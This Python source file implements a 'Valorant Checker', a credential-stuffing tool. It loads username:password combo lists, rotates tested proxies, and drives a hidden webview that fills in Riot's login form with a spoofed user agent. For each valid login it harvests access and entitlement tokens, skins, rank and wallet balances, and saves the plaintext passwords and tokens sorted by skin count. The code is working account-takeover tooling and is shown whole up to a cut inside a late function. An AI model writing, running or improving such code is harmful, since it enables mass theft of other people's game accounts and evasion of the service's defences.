import os
import json
import base64
import time
import urllib.parse
import requests
from datetime import datetime
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import webview
import tkinter as tk
from tkinter import filedialog
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from results_organizer import ResultsOrganizer

import modules.rpc_manager as rpc_manager
from modules.settings import APP_AUTHOR
rpc_manager.set_details("Valorant Checker")

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("Installing colorama...")
    os.system("pip install colorama")
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

COMBO_FILE = "combo.txt"
PROXY_FILE = "proxies.txt"
WORKING_PROXY_FILE = "working_proxies.txt"
working_accounts_dir = "working_accounts"
os.makedirs(working_accounts_dir, exist_ok=True)

skin_folders = {
    "0-4": (0, 4),
    "5-10": (5, 10),
    "10-20": (10, 20),
    "20-30": (20, 30),
    "30andmore": (30, float('inf'))
}
for folder_name in skin_folders:
    os.makedirs(os.path.join(working_accounts_dir, folder_name), exist_ok=True)

class ValorantChecker:
    def __init__(self):
        self.success_count = 0
        self.failed_count = 0
        self.total_count = 0
        self.current_account = ""
        self.running = False
        self.combo_file_path = COMBO_FILE
        self.proxy_file_path = PROXY_FILE
        self.windows = []
        self.proxies = []
        self.working_proxies = []
        self.current_proxy_index = 0
        self.current_proxy = None
        self.proxy_enabled = False
        self.proxy_test_threads = 20
        self.lock = threading.Lock()
        self.results_organizer = ResultsOrganizer()
        self.session_start_time = None
        self.error_messages = [
            "Kullanici adin veya sifren yanlis olabilir",
            "Kullanıcı adın veya şifren yanlış olabilir",
            "Your username or password may be incorrect",
            "用户名或密码可能不正确",
            "El nombre de usuario o la contraseña pueden ser incorrectos",
            "Le nom d'utilisateur ou le mot de passe peut être incorrect",
            "Der Benutzername oder das Passwort ist möglicherweise falsch",
            "Неверное имя пользователя или пароль",
            "ユーザー名またはパスワードが間違っている可能性があります"
        ]

    def safe_close(self, window):
        if window in self.windows:
            try:
                window.destroy()
                self.windows.remove(window)
            except Exception:
                pass

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗
║                                                                                ║
║     {Fore.RED}██╗   ██╗ █████╗ ██╗      ██████╗ ██████╗  █████╗ ███╗   ██╗████████╗{Fore.CYAN}      ║
║     {Fore.RED}██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝{Fore.CYAN}      ║
║     {Fore.RED}██║   ██║███████║██║     ██║   ██║██████╔╝███████║██╔██╗ ██║   ██║{Fore.CYAN}         ║
║     {Fore.RED}╚██╗ ██╔╝██╔══██║██║     ██║   ██║██╔══██╗██╔══██║██║╚██╗██║   ██║{Fore.CYAN}         ║
║      {Fore.RED}╚████╔╝ ██║  ██║███████╗╚██████╔╝██║  ██║██║  ██║██║ ╚████║   ██║{Fore.CYAN}         ║
║       {Fore.RED}╚═══╝  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝{Fore.CYAN}         ║
║                                                                                ║
║            {Fore.YELLOW}█████╗ ██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗{Fore.CYAN}              ║
║           {Fore.YELLOW}██╔══██╗██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗{Fore.CYAN}             ║
║           {Fore.YELLOW}██║  ╚═╝███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝{Fore.CYAN}             ║
║           {Fore.YELLOW}██║  ██╗██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗{Fore.CYAN}             ║
║           {Fore.YELLOW}╚█████╔╝██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║{Fore.CYAN}             ║
║            {Fore.YELLOW}╚════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.CYAN}             ║
║                                                                                ║
║                        {Fore.GREEN}Developer by. {Fore.RED}{APP_AUTHOR}{Fore.CYAN}                                 ║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)

    def print_menu(self):
        proxy_status = f"{Fore.GREEN}ENABLED ({len(self.working_proxies)} working){Fore.CYAN}" if self.proxy_enabled else f"{Fore.RED}DISABLED{Fore.CYAN}"
        menu = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗
║                                   {Fore.YELLOW}MAIN MENU{Fore.CYAN}                                    ║
╠════════════════════════════════════════════════════════════════════════════════╣
║                                                                                ║
║    {Fore.GREEN}[1]{Fore.WHITE} > Select Combo File                                                     {Fore.CYAN}║
║    {Fore.GREEN}[2]{Fore.WHITE} > Load & Test Proxies                                                   {Fore.CYAN}║
║    {Fore.GREEN}[3]{Fore.WHITE} > Start Checking                                                        {Fore.CYAN}║
║    {Fore.GREEN}[4]{Fore.WHITE} > Show Statistics                                                       {Fore.CYAN}║
║    {Fore.GREEN}[5]{Fore.WHITE} > View Valid Accounts                                                   {Fore.CYAN}║
║    {Fore.RED}[6]{Fore.WHITE} > Exit                                                                  {Fore.CYAN}║
║                                                                                ║
║    Proxy Status: {proxy_status}                                                      ║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(menu)

    def print_stats_box(self):
        account_display = self.current_account[:58] + "..." if len(self.current_account) > 58 else self.current_account
        success_ratio = f"{self.success_count}/{self.total_count}" if self.total_count > 0 else "0/0"
        fail_ratio = f"{self.failed_count}/{self.total_count}" if self.total_count > 0 else "0/0"
        proxy_info = f"Using: {self.current_proxy}" if self.current_proxy else "No proxy"
        
        stats = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗
║                           {Fore.YELLOW}LIVE STATISTICS{Fore.CYAN}                                      ║
╠════════════════════════════════════════════════════════════════════════════════╣
║                                                                                ║
║    {Fore.GREEN}[+] Valid:{Fore.WHITE} {success_ratio:<65}{Fore.CYAN}║
║    {Fore.RED}[-] Invalid:{Fore.WHITE} {fail_ratio:<63}{Fore.CYAN}║
║    {Fore.YELLOW}[*] Total:{Fore.WHITE} {self.total_count:<65}{Fore.CYAN}║
║    {Fore.BLUE}[>] Current:{Fore.WHITE} {account_display:<63}{Fore.CYAN}║
║    {Fore.MAGENTA}[P] Proxy:{Fore.WHITE} {proxy_info:<65}{Fore.CYAN}║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        return stats

    def update_log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if "[+]" in message or "Valid" in message or "Success" in message:
            print(f"{Fore.GREEN}[{timestamp}] {message}{Style.RESET_ALL}")
        elif "[-]" in message or "Invalid" in message or "Failed" in message:
            print(f"{Fore.RED}[{timestamp}] {message}{Style.RESET_ALL}")
        elif "[*]" in message or "Trying" in message:
            print(f"{Fore.YELLOW}[{timestamp}] {message}{Style.RESET_ALL}")
        elif "[>]" in message or "Checking" in message:
            print(f"{Fore.CYAN}[{timestamp}] {message}{Style.RESET_ALL}")
        elif "[P]" in message or "Proxy" in message:
            print(f"{Fore.MAGENTA}[{timestamp}] {message}{Style.RESET_ALL}")
        else:
            print(f"{Fore.WHITE}[{timestamp}] {message}{Style.RESET_ALL}")

    def read_combos(self, file_path=None):
        if file_path is None:
            file_path = self.combo_file_path
        try:
            with open(file_path, "r", encoding="utf-8") as file:
                combos = [line.strip().split(":", 1) for line in file if ":" in line]
                return combos
        except FileNotFoundError:
            self.update_log(f"[-] File not found: {file_path}")
            return []
        except Exception as e:
            self.update_log(f"[-] File read error: {str(e)}")
            return []

    def read_proxies(self, file_path=None):
        if file_path is None:
            file_path = self.proxy_file_path
        try:
            with open(file_path, "r", encoding="utf-8") as file:
                proxies = [line.strip() for line in file if line.strip() and not line.strip().startswith('#')]
                return proxies
        except FileNotFoundError:
            self.update_log(f"[-] Proxy file not found: {file_path}")
            return []
        except Exception as e:
            self.update_log(f"[-] Proxy file read error: {str(e)}")
            return []

    def test_single_proxy(self, proxy):
        try:
            proxy_parts = proxy.split(':')
            
            if proxy.startswith('http://') or proxy.startswith('https://'):
                proxy_url = proxy
            elif len(proxy_parts) == 2:
                proxy_url = f"http://{proxy}"
            elif len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_url = f"http://{user}:{password}@{ip}:{port}"
            else:
                return None

            proxies_dict = {
                'http': proxy_url,
                'https': proxy_url
            }

            response = requests.get('https://www.google.com', proxies=proxies_dict, timeout=10)
            
            if response.status_code == 200:
                return proxy
            else:
                return None
                
        except Exception:
            return None

    def save_working_proxies(self):
        try:
            with open(WORKING_PROXY_FILE, 'w', encoding='utf-8') as f:
                f.write(f"Working Proxies - Tested on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total: {len(self.working_proxies)}\n")
                f.write("#\n")
                for proxy in self.working_proxies:
                    f.write(f"{proxy}\n")
            self.update_log(f"[+] Saved {len(self.working_proxies)} working proxies to {WORKING_PROXY_FILE}")
            return True
        except Exception as e:
            self.update_log(f"[-] Error saving working proxies: {str(e)}")
            return False

    def load_and_test_proxies(self):
        self.clear_screen()
        self.print_banner()
        
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        print(f"\n{Fore.YELLOW}Select proxy file (proxies.txt):{Style.RESET_ALL}")
        file_path = filedialog.askopenfilename(
            title="Select Proxy File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile="proxies.txt"
        )
        
        root.destroy()
        
        if not file_path:
            print(f"\n{Fore.YELLOW}No file selected. Using default: proxies.txt{Style.RESET_ALL}")
            file_path = PROXY_FILE
        
        if not os.path.exists(file_path):
            print(f"\n{Fore.RED}[-] File not found: {file_path}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Creating example proxies.txt file...{Style.RESET_ALL}")
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write("Proxy format examples:\n")
                f.write("ip:port\n")
                f.write("http://ip:port\n")
                f.write("ip:port:username:password\n")
                f.write("#\n")
                f.write("Add your proxies below (one per line):\n")
            print(f"{Fore.GREEN}[+] Created {file_path}. Please add your proxies and try again.{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            return
        
        self.proxies = self.read_proxies(file_path)
        
        if not self.proxies:
            print(f"\n{Fore.RED}[-] No proxies found in file!{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                    {Fore.YELLOW}FAST MULTI-THREADED PROXY TESTING{Fore.CYAN}                          ║")
        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║  {Fore.GREEN}Total Proxies:{Fore.WHITE} {len(self.proxies):<62}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║  {Fore.MAGENTA}Threads:{Fore.WHITE} {self.proxy_test_threads:<70}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        self.working_proxies = []
        self.proxy_file_path = file_path
        
        print(f"{Fore.YELLOW}[*] Testing proxies with {self.proxy_test_threads} threads...{Style.RESET_ALL}\n")
        
        tested_count = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.proxy_test_threads) as executor:
            future_to_proxy = {executor.submit(self.test_single_proxy, proxy): proxy for proxy in self.proxies}
            
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                tested_count += 1
                
                try:
                    result = future.result()
                    if result:
                        with self.lock:
                            self.working_proxies.append(result)
                        print(f"{Fore.GREEN}[{tested_count}/{len(self.proxies)}] ✓ Working: {result}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[{tested_count}/{len(self.proxies)}] ✗ Failed: {proxy}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[{tested_count}/{len(self.proxies)}] ✗ Error: {proxy}{Style.RESET_ALL}")
        
        elapsed_time = time.time() - start_time
        
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                         {Fore.YELLOW}TEST COMPLETED{Fore.CYAN}                                         ║")
        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║  {Fore.GREEN}[+] Working:{Fore.WHITE} {len(self.working_proxies):<64}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║  {Fore.RED}[-] Failed:{Fore.WHITE} {len(self.proxies) - len(self.working_proxies):<65}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}[*] Total:{Fore.WHITE} {len(self.proxies):<66}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║  {Fore.MAGENTA}[⏱] Time:{Fore.WHITE} {elapsed_time:.2f} seconds{' ' * (66 - len(f'{elapsed_time:.2f} seconds'))}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        if self.working_proxies:
            self.proxy_enabled = True
            self.current_proxy_index = 0
            self.save_working_proxies()
            print(f"\n{Fore.GREEN}[+] Proxy system enabled with {len(self.working_proxies)} working proxies!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Working proxies saved to: {WORKING_PROXY_FILE}{Style.RESET_ALL}")
        else:
            self.proxy_enabled = False
            print(f"\n{Fore.RED}[-] No working proxies found. Proxy system disabled.{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

    def get_next_proxy(self):
        if not self.working_proxies:
            return None
        
        if self.current_proxy_index >= len(self.working_proxies):
            self.current_proxy_index = 0
        
        proxy = self.working_proxies[self.current_proxy_index]
        self.current_proxy_index += 1
        self.current_proxy = proxy
        return proxy

    def select_combo_file(self):
        self.clear_screen()
        self.print_banner()
        
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        print(f"\n{Fore.YELLOW}Select combo file (combo.txt):{Style.RESET_ALL}")
        file_path = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile="combo.txt"
        )
        
        root.destroy()
        
        if not file_path:
            print(f"\n{Fore.YELLOW}No file selected. Using default: combo.txt{Style.RESET_ALL}")
            file_path = COMBO_FILE
        
        if os.path.exists(file_path):
            combos = self.read_combos(file_path)
            print(f"\n{Fore.GREEN}[+] File loaded successfully!")
            print(f"{Fore.CYAN}[*] Found {len(combos)} accounts.{Style.RESET_ALL}")
            self.combo_file_path = file_path
        else:
            print(f"\n{Fore.RED}[-] File not found: {file_path}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Creating example combo.txt file...{Style.RESET_ALL}")
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write("Add your username:password combinations below (one per line):\n")
                f.write("Example:\n")
                f.write("username1:password1\n")
                f.write("username2:password2\n")
            print(f"{Fore.GREEN}[+] Created {file_path}. Please add your combos and try again.{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

    def show_statistics(self):
        self.clear_screen()
        self.print_banner()
        print(self.print_stats_box())
        
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                          {Fore.YELLOW}FOLDER STATISTICS{Fore.CYAN}                                     ║")
        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        
        for folder_name in skin_folders.keys():
            folder_path = os.path.join(working_accounts_dir, folder_name)
            count = 0
            if os.path.exists(folder_path):
                files = [f for f in os.listdir(folder_path) if f.endswith('.txt')]
                count = len(files)
            
            padding = 72 - len(folder_name) - len(str(count)) - 10
            print(f"{Fore.CYAN}║  {Fore.GREEN}[F] {folder_name}:{Fore.WHITE} {count} accounts{' ' * padding}{Fore.CYAN}║{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

    def view_successful_accounts(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                             {Fore.YELLOW}VALID ACCOUNTS{Fore.CYAN}                                     ║")
        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        
        found_any = False
        for folder_name in skin_folders.keys():
            folder_path = os.path.join(working_accounts_dir, folder_name)
            
            if os.path.exists(folder_path):
                files = [f for f in os.listdir(folder_path) if f.endswith('.txt')]
                
                if files:
                    found_any = True
                    print(f"\n{Fore.GREEN}=== {folder_name} Folder ({len(files)} accounts) ==={Style.RESET_ALL}")
                    
                    for i, filename in enumerate(files[:5], 1):
                        file_path = os.path.join(folder_path, filename)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                data = json.load(f)
                                game_name = data.get('game_name', 'N/A')
                                tag_line = data.get('tag_line', 'N/A')
                                skin_count = data.get('skin_count', 0)
                                rank = data.get('current_rank', 'N/A')
                                print(f"{Fore.CYAN}   {i}. {game_name}#{tag_line} | Skins: {skin_count} | Rank: {rank}{Style.RESET_ALL}")
                        except:
                            print(f"{Fore.YELLOW}   {i}. {filename}{Style.RESET_ALL}")
                    
                    if len(files) > 5:
                        print(f"{Fore.YELLOW}   ... and {len(files) - 5} more accounts{Style.RESET_ALL}")
        
        if not found_any:
            print(f"\n{Fore.YELLOW}   No valid accounts found yet.{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

    def perform_login(self, username, password):
        result = {'access_token': None, 'done': False}
        handled = {'done': False}
        window = webview.create_window(
            "Riot Login",
            "https://auth.riotgames.com/authorize?redirect_uri=https%3A%2F%2Fplayvalorant.com%2Fopt_in&client_id=play-valorant-web-prod&response_type=token%20id_token&nonce=1&scope=account%20openid",
            width=800,
            height=600,
            hidden=True,
            text_select=True
        )
        self.windows.append(window)
        
        def on_loaded():
            max_attempts = 3
            attempt = 0
            start_time = time.time()
            timeout = 15
            
            try:
                window.evaluate_js("""
                    Object.defineProperty(navigator, 'userAgent', {
                        get: function() { return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'; }
                    });
                """)
            except Exception as e:
                self.update_log(f"❌ Failed to set user agent for {username}:{password}: {str(e)}")
            
            while attempt < max_attempts and time.time() - start_time < timeout:
                attempt += 1
                time.sleep(1)
                
                try:
                    current_url = window.get_current_url()
                    parsed_url = urllib.parse.urlparse(current_url)
                    fragment = urllib.parse.parse_qs(parsed_url.fragment)
                    if "access_token" in fragment:
                        access_token = fragment["access_token"][0]
                        if not handled['done']:
                            self.update_log(f"[+] Valid login: {username}")
                            result['access_token'] = access_token
                            result['done'] = True
                            handled['done'] = True
                        self.safe_close(window)
                        return
                except Exception as e:
                    self.update_log(f"❌ URL check error for {username}:{password}: {str(e)}")
                
                try:
                    html = window.evaluate_js('document.documentElement.outerHTML') or ""
                    if any(msg in html for msg in self.error_messages):
                        if not handled['done']:
                            self.update_log(f"[-] Invalid credentials: {username}")
                            result['access_token'] = None
                            result['done'] = True
                            handled['done'] = True
                        self.safe_close(window)
                        return
                except Exception as e:
                    self.update_log(f"❌ HTML check error for {username}:{password}: {str(e)}")
                
                form_ready_js = """
                (function() {
                    let usernameInput = document.querySelector('input[name="username"]');
                    let passwordInput = document.querySelector('input[name="password"]');
                    let submitButton = document.querySelector('button[data-testid="btn-signin-submit"]');
                    return usernameInput && passwordInput && submitButton;
                })();
                """
                try:
                    form_ready = window.evaluate_js(form_ready_js)
                except Exception as e:
                    form_ready = False
                    self.update_log(f"❌ Form ready check error for {username}:{password}: {str(e)}")
                
                if form_ready:
                    js_code = f"""
                    (function() {{
                        function setNativeValue(element, value) {{
                            let lastValue = element.value;
                            element.value = value;
                            let event = new Event('input', {{ bubbles: true }});
                            event.simulated = true;
                            let tracker = element._valueTracker;
                            if (tracker) {{
                                tracker.setValue(lastValue);
                            }}
                            element.dispatchEvent(event);
                        }}
                        let usernameInput = document.querySelector('input[name="username"]');
                        let passwordInput = document.querySelector('input[name="password"]');
                        let submitButton = document.querySelector('button[data-testid="btn-signin-submit"]');
                        if (usernameInput && passwordInput && submitButton) {{
                            setNativeValue(usernameInput, '{username}');
                            setNativeValue(passwordInput, '{password}');
                            setTimeout(() => submitButton.click(), 500);
                            return {{success: true}};
                        }}
                        return {{success: false}};
                    }})();
                    """
                    try:
                        result_check = window.evaluate_js(js_code)
                        if not result_check.get('success', False):
                            self.update_log(f"❌ Failed to submit form for {username}:{password}")
                            result['access_token'] = None
                            result['done'] = True
                            handled['done'] = True
                            self.safe_close(window)
                            return
                    except Exception as e:
                        self.update_log(f"❌ JavaScript error for {username}:{password}: {str(e)}")
                        result['access_token'] = None
                        result['done'] = True
                        handled['done'] = True
                        self.safe_close(window)
                        return
                
                time.sleep(2)
                
                try:
                    current_url = window.get_current_url()
                    parsed_url = urllib.parse.urlparse(current_url)
                    fragment = urllib.parse.parse_qs(parsed_url.fragment)
                    if "access_token" in fragment:
                        access_token = fragment["access_token"][0]
                        if not handled['done']:
                            self.update_log(f"[+] Valid login: {username}")
                            result['access_token'] = access_token
                            result['done'] = True
                            handled['done'] = True
                        self.safe_close(window)
                        return
                except Exception as e:
                    self.update_log(f"❌ Final URL check error for {username}:{password}: {str(e)}")
                
                try:
                    html = window.evaluate_js('document.documentElement.outerHTML') or ""
                    if any(msg in html for msg in self.error_messages):
                        if not handled['done']:
                            self.update_log(f"[-] Invalid credentials: {username}")
                            result['access_token'] = None
                            result['done'] = True
                            handled['done'] = True
                        self.safe_close(window)
                        return
                except Exception as e:
                    self.update_log(f"❌ Final HTML check error for {username}:{password}: {str(e)}")
            
            if not handled['done']:
                self.update_log(f"[-] Timeout or failure for {username}")
                result['access_token'] = None
                result['done'] = True
                handled['done'] = True
            self.safe_close(window)
        
        window.events.loaded += on_loaded
        try:
            webview.start()
        except Exception as e:
            self.update_log(f"❌ Window error for {username}:{password}: {str(e)}")
            self.safe_close(window)
            return None
        
        start_time = time.time()
        timeout = 20
        while not result['done'] and time.time() - start_time < timeout:
            time.sleep(0.1)
        
        return result['access_token']

    def get_account_info_and_entitlements(self, access_token, username, password):
        try:
            proxies_dict = None
            if self.proxy_enabled and self.current_proxy:
                proxy_parts = self.current_proxy.split(':')
                
                if self.current_proxy.startswith('http://') or self.current_proxy.startswith('https://'):
                    proxy_url = self.current_proxy
                elif len(proxy_parts) == 2:
                    proxy_url = f"http://{self.current_proxy}"
                elif len(proxy_parts) == 4:
                    ip, port, user, password = proxy_parts
                    proxy_url = f"http://{user}:{password}@{ip}:{port}"
                else:
                    proxy_url = None
                
                if proxy_url:
                    proxies_dict = {'http': proxy_url, 'https': proxy_url}

            headers_auth = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}

            ent_response = requests.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers_auth, json={}, timeout=10, proxies=proxies_dict)
            if ent_response.status_code != 200:
                self.update_log(f"[-] Failed to get entitlements token: {ent_response.status_code}")
                return None
            
            entitlements_token = ent_response.json().get('entitlements_token')
            if not entitlements_token:
                self.update_log("[-] Empty entitlements token")
                return None

            user_info_response = requests.get('https://auth.riotgames.com/userinfo', headers=headers_auth, timeout=10, proxies=proxies_dict)
            if user_info_response.status_code != 200:
                self.update_log(f"[-] Failed to get user info: {user_info_response.status_code}")
                return None
            
            user_info = user_info_response.json()
            puuid = user_info.get('sub')
            if not puuid:
                self.update_log("[-] Failed to get PUUID")
                return None

            region_response = requests.get('https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant', headers=headers_auth, timeout=10, proxies=proxies_dict)
            region = region_response.json().get('affinities', {}).get('live', 'eu') if region_response.status_code == 200 else 'eu'
            regions = [region] if region else ['eu', 'na', 'ap', 'kr', 'latam']

            platform_info = base64.b64encode(json.dumps({
                "platformType": "PC",
                "platformOS": "Windows",
                "platformOSVersion": "10.0.19042.1.256.64bit",
                "platformChipset": "Unknown"
            }).encode()).decode()

            client_version = self.get_client_version()

            for region in regions:
                headers_game = {
                    'Authorization': f'Bearer {access_token}',
                    'X-Riot-Entitlements-JWT': entitlements_token,
                    'Content-Type': 'application/json',
                    'X-Riot-ClientPlatform': platform_info,
                    'X-Riot-ClientVersion': client_version
                }

                try:
                    skin_response = requests.get(
                        f'https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433',
                        headers=headers_game,
                        timeout=10,
                        proxies=proxies_dict
                    )
                    
                    skin_names = []
                    if skin_response.status_code == 200:
                        response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt', timeout=10, proxies=proxies_dict)
                        if response_API.status_code == 200:
                            skins_list = response_API.text.splitlines()
                            skins = skin_response.json().get('Entitlements', [])
                            
                            for skin in skins:
                                uid_to_search = skin['ItemID'].lower()
                                for item in skins_list:
                                    details = item.split("|")
                                    if len(details) < 2:
                                        continue
                                    name_part, id_part = details[0], details[1]
                                    name = name_part.split(":")[1].strip()
                                    skin_id = id_part.split(":")[0].lower().strip()
                                    if skin_id == uid_to_search and name.lower() not in ['standard', 'default', 'random']:
                                        if name not in skin_names:
                                            skin_names.append(name)

                    loadout_response = requests.get(
                        f'https://pd.{region}.a.pvp.net/personalization/v1/players/{puuid}/playerloadout',
                        headers=headers_game,
                        timeout=10,
                        proxies=proxies_dict
                    )
                    
                    if loadout_response.status_code == 200:
                        loadout_data = loadout_response.json()
                        response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt', timeout=10, proxies=proxies_dict)
                        if response_API.status_code == 200:
                            skins_list = response_API.text.splitlines()
                            for weapon in loadout_data.get('Guns', []):
                                skin_uuid = weapon.get('SkinID')
                                if skin_uuid:
                                    for item in skins_list:
                                        details = item.split("|")
                                        if len(details) < 2:
                                            continue
                                        name_part, id_part = details[0], details[1]
                                        name = name_part.split(":")[1].strip()
                                        skin_id = id_part.split(":")[0].lower().strip()
                                        if skin_id == skin_uuid.lower() and name.lower() not in ['standard', 'default', 'random']:
                                            if name not in skin_names:
                                                skin_names.append(name)

                    xp_data = requests.get(f'https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}', headers=headers_game, timeout=10, proxies=proxies_dict)
                    xp_json = xp_data.json() if xp_data.status_code == 200 else {}

                    mmr_data = requests.get(f'https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}', headers=headers_game, timeout=10, proxies=proxies_dict)
                    mmr_json = mmr_data.json() if mmr_data.status_code == 200 else {}

                    wallet = requests.get(f'https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}', headers=headers_game, timeout=10, proxies=proxies_dict)
                    wallet_json = wallet.json() if wallet.status_code == 200 else {}

                    seasonal = mmr_json.get("QueueSkills", {}).get("competitive", {}).get("SeasonalInfoBySeasonID", {})
                    rank = 0
                    rating = 0
                    if seasonal:
                        latest = sorted(seasonal.keys())[-1]
                        rank = seasonal[latest].get("CompetitiveTier", 0)
                        rating = seasonal[latest].get("RankedRating", 0)

                    rank_map = {
                        0: 'Unranked', 1: 'Iron 1', 2: 'Iron 2', 3: 'Iron 3',
                        4: 'Bronze 1', 5: 'Bronze 2', 6: 'Bronze 3',
                        7: 'Silver 1', 8: 'Silver 2', 9: 'Silver 3',
                        10: 'Gold 1', 11: 'Gold 2', 12: 'Gold 3',
                        13: 'Platinum 1', 14: 'Platinum 2', 15: 'Platinum 3',
                        16: 'Diamond 1', 17: 'Diamond 2', 18: 'Diamond 3',
                        19: 'Ascendant 1', 20: 'Ascendant 2', 21: 'Ascendant 3',
                        22: 'Immortal 1', 23: 'Immortal 2', 24: 'Immortal 3',
                        25: 'Radiant'
                    }

                    account_info = {
                        'puuid': puuid,
                        'game_name': user_info.get('acct', {}).get('game_name', 'N/A'),
                        'tag_line': user_info.get('acct', {}).get('tag_line', 'N/A'),
                        'username': username,
                        'password': password,
                        'account_level': xp_json.get('Progress', {}).get('Level', 'N/A'),
                        'current_rank': rank_map.get(rank, 'Unranked'),
                        'rank_rating': rating,
                        'region': region,
                        'valorant_points': wallet_json.get('Balances', {}).get('85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741', 0),
                        'radianite_points': wallet_json.get('Balances', {}).get('e59aa87c-4cbf-517a-5983-6e81511be9b7', 0),
                        'skin_count': len(skin_names),
                        'skin_names': skin_names,
                        'last_checked': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'access_token': access_token,
                        'entitlements_token': entitlements_token
                    }

                    self.save_account_info(account_info)
                    self.update_log(f"[+] Account info retrieved - Skins: {len(skin_names)}, Rank: {rank_map.get(rank, 'Unranked')}")
                    return account_info

                except Exception as e:
                    continue

            self.update_log(f"[-] Failed to get data from any region")
            return None

        except Exception as e:
            self.update_log(f"[-] get_account_info error: {str(e)}")
            return None

    def get_client_version(self):
        try:
